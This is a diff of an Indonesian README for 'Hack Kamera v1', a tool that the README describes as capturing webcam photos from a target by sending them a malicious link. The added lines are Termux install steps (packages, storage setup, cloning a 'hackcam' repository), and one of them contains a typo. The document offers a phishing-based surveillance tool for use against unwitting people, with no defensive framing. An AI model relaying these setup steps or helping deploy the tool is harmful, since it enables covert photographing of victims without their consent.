@@ -1,5 +1,14 @@
 # Hack Kamera v1
 Wkwk :-)
+pkg install git -y 
+pkg install openssh -y 
+pkg install bash -y 
+pkg install php -y
+ pks install wget -y
+termux-setup-storage 
+ cd /sdcard
+ git clone 
+https://github.com/jallySB/hackcam
 
 Ambil potret webcam dari target hanya dengan mengirim tautan jahat
 
